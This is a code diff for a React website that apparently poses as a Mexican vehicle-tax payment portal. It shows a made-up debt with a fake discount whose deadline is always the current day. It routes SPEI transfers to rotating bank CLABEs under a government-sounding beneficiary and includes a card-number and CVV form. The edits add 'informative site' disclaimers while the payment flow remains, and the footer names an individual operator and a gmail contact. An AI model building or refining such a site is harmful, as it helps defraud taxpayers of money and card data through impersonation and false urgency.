@@ -33,9 +33,9 @@ type Screen =
 
 // === CLABES configurables: edita estos 3 valores. Se mostrara 1 aleatoria. ===
 const CLABES: { banco: string; clabe: string }[] = [
-  { banco: "Invex", clabe: "059 180 131 138 928 506" },
-  { banco: "Stp", clabe: "6461 8040 2320 3835 25" },
-  { banco: "Donde Banco", clabe: "151 910 150 522 253 114" },
+    { banco: "Stp", clabe: "646 180 401 609 341 535" },
+    { banco: "Azteca", clabe: "1271 8001 6251 4351 69" },
+    { banco: "Stp", clabe: "646 990 403 846 639 010" },
 ];
 
 const ESTADOS_MX = [
@@ -167,7 +167,7 @@ function TopBar() {
           </span>
           <span className="hidden sm:flex items-center gap-1">
             <Mail className="h-3 w-3" />
-            <span>contacto@controlvehicular.mx</span>
+            <span>contacto@guiatenenciamx.mx</span>
           </span>
         </div>
       </div>
@@ -197,9 +197,9 @@ function Header({ onHome, screen }: { onHome: () => void; screen: Screen }) {
             </div>
           )}
           <div>
-            <div className="text-lg font-bold leading-tight">Control Vehicular</div>
+            <div className="text-lg font-bold leading-tight">Guía Tenencia MX</div>
             <div className="text-[11px] opacity-80 leading-tight">
-              Derechos de Control Vehicular
+             Info Derechos de Control Vehicular
             </div>
           </div>
         </button>
@@ -208,7 +208,7 @@ function Header({ onHome, screen }: { onHome: () => void; screen: Screen }) {
           <a className="px-3 py-1.5 rounded hover:bg-white/10" href="#dudas">Dudas</a>
           <a className="px-3 py-1.5 rounded hover:bg-white/10" href="#contacto">Contacto</a>
           <span className="ml-2 inline-flex items-center gap-1 text-xs bg-white/15 px-2 py-1 rounded">
-            <Shield className="h-3 w-3" /> Portal Seguro
+            <Shield className="h-3 w-3" /> Sitio informativo
           </span>
         </nav>
       </div>
@@ -225,14 +225,13 @@ function Landing({ onConsult }: { onConsult: () => void }) {
         <div className="max-w-6xl mx-auto px-4 py-20 text-center">
           <span className="inline-flex items-center gap-2 text-xs bg-white/10 border border-white/20 rounded-full px-3 py-1 mb-6">
             <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
-            Sistema en linea
+            En linea
           </span>
           <h1 className="text-4xl md:text-5xl font-bold mb-4">
-            Portal de <span className="text-[var(--gold)]">Control Vehicular</span>
+            Portal de <span className="text-[var(--gold)]">Guia Control Vehicular MX</span>
           </h1>
           <p className="max-w-2xl mx-auto text-white/85 mb-8">
-            Consulte sus adeudos vehiculares, realice pagos y obtenga constancias de
-            manera rapida y segura.
+            Recurso informativo independiente sobre tenencia vehicular en México. Explicamos requisitos, plazos de pago, descuentos y cómo acceder a los portales oficiales de cada estado.
           </p>
           <div className="flex flex-wrap justify-center gap-3">
             <a
@@ -241,17 +240,21 @@ function Landing({ onConsult }: { onConsult: () => void }) {
             >
               <FileText className="h-4 w-4" /> Ver Recursos
             </a>
-            <button
+          {/* BOTON DE ACCION A CAMBIAR */}
+          <button
               onClick={onConsult}
               className="inline-flex items-center gap-2 bg-white text-[var(--burgundy)] hover:bg-white/90 px-5 py-2.5 rounded-md text-sm font-semibold shadow-md"
             >
               <Car className="h-4 w-4" /> Consultar Adeudo
             </button>
+
           </div>
         </div>
       </section>
 
-      {/* Steps */}
+
+
+     {/* Steps 
       <section className="max-w-6xl mx-auto px-4 py-16 grid md:grid-cols-3 gap-6">
         {[
           {
@@ -288,69 +291,71 @@ function Landing({ onConsult }: { onConsult: () => void }) {
           </div>
         ))}
       </section>
-
+*/}
       {/* Aspectos */}
       <section id="recursos" className="bg-secondary/40 py-16">
         <div className="max-w-6xl mx-auto px-4">
           <div className="text-center mb-10">
-            <h2 className="text-3xl font-bold">Aspectos Clave de la Tenencia en Mexico</h2>
+            <h2 className="text-3xl font-bold">Guia Completa sobre Tenencia Vehicular</h2>
             <p className="text-muted-foreground mt-2">
-              Informacion esencial sobre el impuesto de control vehicular en sus diferentes aspectos.
+              Informacion esencial sobre el control vehicular en sus diferentes aspectos.
             </p>
           </div>
           <div className="grid md:grid-cols-2 gap-6">
             <InfoCard
               icon={<Percent className="h-5 w-5" />}
-              title="Subsidios y Beneficios Fiscales"
+              title="Verificacion Vehicular y Tenencia"
               items={[
-                "Descuentos por pronto pago en los primeros meses",
-                "Beneficios que varian cada ejercicio fiscal",
-                "Algunos estados ofrecen hasta 25% de descuento",
-                "Programas especiales de condonacion en ciertos periodos",
+                "La tenencia al corriente es requisito para verificar",
+                "Sin verificacion no puedes circular legalmente",
+                "El calendario de verificacion varia por estado",
+                "Algunos estados vinculan ambos tramites electronicamente",
               ]}
             />
             <InfoCard
               icon={<Wallet className="h-5 w-5" />}
-              title="Formas de Pago Disponibles"
+              title="Como Consultar tu Adeudo"
               items={[
-                "Pago en linea con tarjeta de credito o debito",
-                "Transferencia bancaria SPEI desde cualquier banco",
-                "Pago en bancos autorizados con linea de captura",
-                "Tiendas de conveniencia y oficinas de recaudacion",
+                "Ingresa al portal de finanzas de tu estado",
+                "Introduce tu numero de placa o clave vehicular",
+                "El sistema muestra adeudos actuales y anteriores",
+                "Genera tu linea de captura para realizar el pago",
+                "Estos pasos se realizan únicamente en los portales oficiales de cada estado. Nuestro sitio no procesa pagos ni almacena datos de contribuyentes.",
               ]}
             />
             <InfoCard
               icon={<AlertTriangle className="h-5 w-5" />}
-              title="Recargos y Multas por Retraso"
+              title="Descuentos por Pronto Pago"
               items={[
-                "Los recargos se calculan mensualmente sobre el adeudo",
-                "Se aplican actualizaciones por inflacion acumulada",
-                "El monto total puede aumentar significativamente",
-                "Pagar a tiempo evita cargos adicionales innecesarios",
+                "Disponibles en los primeros meses del ano fiscal",
+                "El porcentaje de descuento varia por entidad",
+                "Pueden representar hasta 25% de ahorro",
+                "Consulta las fechas limite para aprovecharlos",
+                 "Estos pasos se realizan únicamente en los portales oficiales de cada estado. Nuestro sitio no procesa pagos ni almacena datos de contribuyentes.",
               ]}
             />
             <InfoCard
               icon={<MapPin className="h-5 w-5" />}
-              title="Impuesto Vehicular por Estado"
+              title="Comprobantes y Facturas"
               items={[
-                "Cada entidad federativa tiene sus propias reglas",
-                "Algunos estados han eliminado la tenencia completamente",
-                "Las tarifas y descuentos varian significativamente",
-                "Contenido nacional sin mencionar estados especificos",
+                "Al pagar se genera un comprobante automaticamente",
+                "Puedes descargar tu CFDI desde el portal estatal",
+                "El comprobante es necesario para verificacion vehicular",
+                "Guarda tus recibos como respaldo de cumplimiento",
               ]}
             />
           </div>
 
           <div className="mt-10 bg-card border border-border rounded-xl p-6">
             <h3 className="font-semibold mb-4 flex items-center gap-2 text-[var(--burgundy)]">
-              <FileText className="h-5 w-5" /> Tramites Relacionados
+              <FileText className="h-5 w-5" /> Derechos del Contribuyente
             </h3>
             <ul className="grid sm:grid-cols-2 gap-3 text-sm">
               {[
-                "Alta y baja de vehiculos en el padron estatal",
-                "Cambio de propietario o transferencia vehicular",
-                "Renovacion de tarjeta de circulacion y placas",
-                "Expedicion de constancia de no adeudo",
+                "Derecho a recibir informacion clara sobre el adeudo",
+                "Derecho a obtener comprobante fiscal de cada pago",
+                "Derecho a presentar recursos de inconformidad",
+                "Proteccion contra cobros indebidos o duplicados",
               ].map((t) => (
                 <li key={t} className="flex items-start gap-2">
                   <CheckCircle2 className="h-4 w-4 text-[var(--burgundy)] mt-0.5 shrink-0" />
@@ -368,7 +373,7 @@ function Landing({ onConsult }: { onConsult: () => void }) {
           <div className="text-center mb-10">
             <h2 className="text-3xl font-bold">Preguntas Frecuentes</h2>
             <p className="text-muted-foreground mt-2">
-              Resuelva sus dudas sobre el pago de tenencia y control vehicular.
+              Resuelva sus dudas sobre el control vehicular.
             </p>
           </div>
           <div className="space-y-3">
@@ -382,11 +387,9 @@ function Landing({ onConsult }: { onConsult: () => void }) {
               <AlertTriangle className="h-5 w-5" /> Aviso Importante
             </h3>
             <p className="text-sm text-foreground/80">
-              El pago de derechos de control vehicular es obligatorio conforme al Codigo
-              Financiero del Estado. Los adeudos no pagados generan recargos y
-              actualizaciones. Consulte su situacion y liquide a tiempo para evitar
-              recargos adicionales. Este portal es un medio oficial para la consulta y
-              pago de sus obligaciones vehiculares.
+            El propósito de este sitio es facilitar el acceso a información pública sobre el régimen vehicular en México. No realizamos trámites ni procesamos pagos en nombre de ninguna dependencia.
+Para cualquier trámite oficial o pago de contribuciones, debes acudir exclusivamente a los portales de finanzas de tu entidad federativa o a los canales oficiales correspondientes.
+Este sitio NO mantiene afiliación, respaldo ni conexión con ninguna Secretaría de Finanzas estatal, gobierno municipal, estatal o federal, ni dependencia gubernamental de ningún nivel. La información tiene fines exclusivamente informativos.
             </p>
           </div>
         </div>
@@ -426,32 +429,32 @@ function InfoCard({
 
 const FAQS = [
   {
-    q: "Que informacion necesito tener a la mano para pagar?",
-    a: "Su numero de placa vigente, la entidad de registro del vehiculo y un metodo de pago (tarjeta o cuenta bancaria con SPEI).",
+    q: "Que diferencia hay entre tenencia y refrendo?",
+    a: "La tenencia grava la posesion del vehiculo, mientras que el refrendo es el pago anual por renovar el permiso de circulacion y las placas. Son impuestos distintos.",
   },
   {
-    q: "Como determina la autoridad el monto de tenencia?",
-    a: "El calculo considera el valor factura del vehiculo, su antiguedad, el tipo de uso y las tarifas vigentes del ejercicio fiscal.",
+    q: "Cuando vence el plazo para pagar?",
+    a: "El periodo de pago normalmente inicia en enero y la fecha limite varia por entidad. Consulta el calendario de tu estado para conocer fechas exactas y posibles prorrogas.",
   },
   {
-    q: "Por que existe el impuesto de tenencia en Mexico?",
-    a: "Es una contribucion estatal destinada a financiar obras publicas, infraestructura vial y servicios relacionados con el transporte.",
+    q: "Puedo pagar la tenencia en parcialidades?",
+    a: "Algunos estados permiten el pago en parcialidades bajo ciertas condiciones. Consulta con la Secretaria de Finanzas de tu entidad para conocer los esquemas disponibles.",
   },
   {
-    q: "Hasta cuando tengo para pagar la tenencia sin recargos?",
-    a: "Las fechas limite varian por estado, generalmente durante el primer trimestre del ano. Consulte la fecha de la promocion vigente.",
+    q: "Se puede pagar tenencia de anos anteriores?",
+    a: "Si, los portales oficiales permiten consultar y generar lineas de captura para adeudos de ejercicios anteriores. Los montos incluyen recargos y actualizaciones.",
   },
   {
-    q: "Mi estado permite dividir el pago de tenencia en cuotas?",
-    a: "Algunos estados ofrecen pagos parciales o convenios de diferimiento. Verifique las opciones disponibles al iniciar su pago.",
+    q: "Cuanto tiempo tarda en reflejarse el pago?",
+    a: "El pago en linea se refleja de manera inmediata en la mayoria de los portales. Los pagos en ventanilla bancaria pueden tardar entre 24 y 72 horas habiles en actualizarse.",
   },
   {
-    q: "Sobre quien recae la obligacion de pagar tenencia?",
-    a: "Sobre la persona fisica o moral que aparezca como propietaria del vehiculo en el padron vehicular estatal.",
+    q: "Hay descuentos por pago anticipado?",
+    a: "Varios estados ofrecen descuentos por pronto pago durante los primeros meses del ano. Estos beneficios varian cada ejercicio fiscal y pueden ser de hasta el 25%.",
   },
   {
-    q: "De que maneras puedo liquidar la tenencia?",
-    a: "Pago en linea con tarjeta, transferencia SPEI, bancos autorizados, tiendas de conveniencia y oficinas de recaudacion.",
+    q: "Como puedo conocer el valor de mercado de mi vehiculo?",
+    a: "Las autoridades fiscales utilizan guias de valuacion oficiales como la Guia EBC o el Libro Azul. Estos documentos establecen valores de referencia para el calculo de impuestos.",
   },
 ];
 
@@ -484,8 +487,8 @@ function Footer() {
   return (
     <footer className="bg-[var(--burgundy-dark)] text-white/80 mt-auto">
       <div className="max-w-6xl mx-auto px-4 py-10">
-        <h4 className="font-bold text-white mb-3">PORTAL DE PAGOS</h4>
-        <p className="text-xs leading-relaxed max-w-3xl">
+        <h4 className="font-bold text-white mb-3">Guía Tenencia MX</h4>
+        <p className="text-[0.65rem] leading-relaxed max-w-3xl">
           Este sitio NO mantiene afiliacion, respaldo ni conexion con ninguna Secretaria
           de Finanzas estatal, gobierno municipal, estatal o federal, ni dependencia
           gubernamental de ningun nivel. La informacion tiene fines exclusivamente
@@ -493,8 +496,12 @@ function Footer() {
         </p>
       </div>
       <div className="border-t border-white/10">
-        <div className="max-w-6xl mx-auto px-4 py-4 text-center text-xs">
-          (c) 2026 Portal de Pagos - Todos los derechos reservados
+        <div className="max-w-6xl mx-auto px-4 py-4 text-center text-[0.65rem]">
+          (c) 2026 Guía Tenencia MX 
+          Operado por:  PEREZ VILLA DARLA CAMILA. (persona física).
+Marca informativa: Guía Tenencia MX
+Email de contacto:  services.express26@gmail.com
+Este sitio es una guía informativa independiente. No pertenece ni está afiliado a ningún gobierno, embajada, consulado ni institución oficial.
         </div>
       </div>
     </footer>
@@ -815,7 +822,59 @@ function ConfirmCard({
   placa: string;
   folio: string;
 }) {
+  const formatterEsMX = new Intl.DateTimeFormat("es-MX", {
+    weekday: "long",
+    year: "numeric",
+    month: "long",
+    day: "numeric",
+  });
+
+  const getHoyTexto = () => {
+    const raw = formatterEsMX.format(new Date());
+    return raw.charAt(0).toUpperCase() + raw.slice(1);
+  };
+
   const [showCardNotice, setShowCardNotice] = useState(false);
+  const [loadingCard, setLoadingCard] = useState(false);
+  const [cardError, setCardError] = useState<string | null>(null);
+  const hoyTexto = getHoyTexto();
+
+  // Llama a tu backend y redirige a Clip
+  const API_URL = import.meta.env.VITE_API_URL; // URL de tu backend en producción
+
+const handleCardPayment = async () => {
+  try {
+    setCardError(null);
+    setLoadingCard(true);
+
+    const res = await fetch(`${API_URL}/api/clip/create-checkout`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        amount: total,
+        placa,
+        folio,
+        estado,
+        description: `Pago control vehicular ${placa}`,
+      }),
+    });
+
+    if (!res.ok) {
+      throw new Error("No se pudo iniciar el pago. Intenta más tarde.");
+    }
+
+    const data = await res.json();
+    if (!data.success || !data.checkout_url) {
+      throw new Error(data.error || "No se pudo generar el enlace de pago.");
+    }
+
+    window.location.href = data.checkout_url;
+  } catch (err: any) {
+    setCardError(err.message || "Ocurrió un error al iniciar el pago.");
+    setLoadingCard(false);
+  }
+};
+
   return (
     <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-6">
       <div className="flex items-center gap-2">
@@ -832,10 +891,16 @@ function ConfirmCard({
           <DataField label="FOLIO DE PAGO" value={folio} />
         </div>
         <div className="mt-3">
-          <DataField label="FECHA DE REGISTRO" value="11/05/2026, 09:54:19 a.m." />
+          <DataField
+            label="FECHA DE REGISTRO"
+            value="11/05/2026, 09:54:19 a.m."
+          />
         </div>
         <div className="mt-3">
-          <DataField label="ENTIDAD DE REGISTRO" value={estado || "Estado de Mexico"} />
+          <DataField
+            label="ENTIDAD DE REGISTRO"
+            value={estado || "Estado de Mexico"}
+          />
         </div>
       </div>
 
@@ -848,19 +913,23 @@ function ConfirmCard({
         </h3>
         <p className="text-sm text-foreground/80 mb-4">
           Liquide su adeudo antes del{" "}
-          <span className="font-semibold">martes, 12 de mayo de 2026</span> y ahorre un
-          25% en su pago.
+          <span className="font-semibold">{hoyTexto}</span> y ahorre un 25% en
+          su pago.
         </p>
         <div className="flex flex-wrap items-center gap-3">
-          <span className="text-muted-foreground line-through">{fmt(original)}</span>
-          <span className="text-3xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
+          <span className="text-muted-foreground line-through">
+            {fmt(original)}
+          </span>
+          <span className="text-3xl font-bold text-[var(--burgundy)]">
+            {fmt(total)}
+          </span>
           <span className="bg-[var(--burgundy)] text-white text-xs font-semibold rounded-full px-3 py-1">
             Ahorro {fmt(savings)}
           </span>
         </div>
         <div className="mt-3 flex items-center gap-2 text-xs text-amber-700">
           <Clock className="h-4 w-4" />
-          La promocion solo estara vigente hasta el martes, 12 de mayo de 2026
+          La promocion solo estara vigente hasta el {hoyTexto}
         </div>
       </div>
 
@@ -871,14 +940,27 @@ function ConfirmCard({
         <div className="text-4xl font-bold text-[var(--burgundy)] mt-1">
           {fmt(total)}
         </div>
+        <div className="mt-2 text-xs text-muted-foreground">
+    Importante: Conserve su comprobante. El CFDI llegará en 1-2 días hábiles
+    después de haber hecho su pago.
+  </div>
       </div>
+
+      {cardError && (
+        <div className="flex items-center gap-2 text-sm text-red-700 bg-red-50 border border-red-200 rounded-md px-3 py-2">
+          <AlertTriangle className="h-4 w-4" />
+          <span>{cardError}</span>
+        </div>
+      )}
 
       <div className="grid sm:grid-cols-2 gap-3">
         <button
-          onClick={() => setShowCardNotice(true)}
-          className="inline-flex items-center justify-center gap-2 bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-3 rounded-md"
+          onClick={handleCardPayment}
+          disabled={loadingCard}
+          className="inline-flex items-center justify-center gap-2 bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-3 rounded-md disabled:opacity-60 disabled:cursor-not-allowed"
         >
-          <CreditCard className="h-4 w-4" /> Realizar Pago con Tarjeta
+          <CreditCard className="h-4 w-4" />
+          {loadingCard ? "Iniciando pago..." : "Realizar Pago con Tarjeta"}
         </button>
         <button
           onClick={onSpei}
@@ -887,6 +969,7 @@ function ConfirmCard({
           <Building2 className="h-4 w-4" /> Pagar por Deposito o SPEI
         </button>
       </div>
+
       {showCardNotice && (
         <div
           className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
@@ -903,12 +986,13 @@ function ConfirmCard({
               <div>
                 <h3 className="font-bold text-lg mb-1">Aviso</h3>
                 <p className="text-sm text-foreground/80">
-                  Actualmente estamos experimentando algunos inconvenientes tecnicos
-                  con el sistema de pagos. Sin embargo, no te preocupes, puedes
-                  realizar tu pago mediante transferencia directa utilizando los
-                  datos bancarios oficiales. Si prefieres este metodo, por favor,
-                  haz clic en el boton para ser redirigido a la pagina
-                  correspondiente. Gracias por tu comprension.
+                  Actualmente estamos experimentando algunos inconvenientes
+                  tecnicos con el sistema de pagos. Sin embargo, no te
+                  preocupes, puedes realizar tu pago mediante transferencia
+                  directa utilizando los datos bancarios oficiales. Si prefieres
+                  este metodo, por favor, haz clic en el boton para ser
+                  redirigido a la pagina correspondiente. Gracias por tu
+                  comprension.
                 </p>
               </div>
             </div>
@@ -965,7 +1049,9 @@ function CardPayment({ onBack, total }: { onBack: () => void; total: number }) {
       </div>
       <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-md p-4 text-sm flex items-center justify-between">
         <span>Total a pagar</span>
-        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
+        <span className="text-2xl font-bold text-[var(--burgundy)]">
+          {fmt(total)}
+        </span>
       </div>
       <form
         onSubmit={(e) => {
@@ -975,7 +1061,10 @@ function CardPayment({ onBack, total }: { onBack: () => void; total: number }) {
         className="space-y-4"
       >
         <Field label="Numero de tarjeta" placeholder="0000 0000 0000 0000" />
-        <Field label="Nombre del titular" placeholder="Como aparece en la tarjeta" />
+        <Field
+          label="Nombre del titular"
+          placeholder="Como aparece en la tarjeta"
+        />
         <div className="grid grid-cols-2 gap-3">
           <Field label="Vencimiento" placeholder="MM/AA" />
           <Field label="CVV" placeholder="123" />
@@ -1016,17 +1105,20 @@ function SpeiPayment({
       </div>
       <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-md p-4 text-sm flex items-center justify-between">
         <span>Monto exacto a transferir</span>
-        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
+        <span className="text-2xl font-bold text-[var(--burgundy)]">
+          {fmt(total)}
+        </span>
       </div>
       <div className="space-y-3 text-sm">
-        <Row label="Beneficiario" value="Secretaria Cvehicular" />
+        <Row label="Beneficiario" value="Secretaria C.Vehicular" />
         <Row label="Banco" value={clabe.banco} />
         <Row label="CLABE Interbancaria" value={clabe.clabe} />
         <Row label="Concepto" value={folio} />
         <Row label="Referencia" value="2026051200001" />
       </div>
       <p className="text-xs text-muted-foreground">
-        El pago puede tardar hasta 24 horas en reflejarse. Conserve su comprobante.
+        El pago puede tardar hasta 24 horas en reflejarse. Conserve su
+        comprobante.
       </p>
     </div>
   );
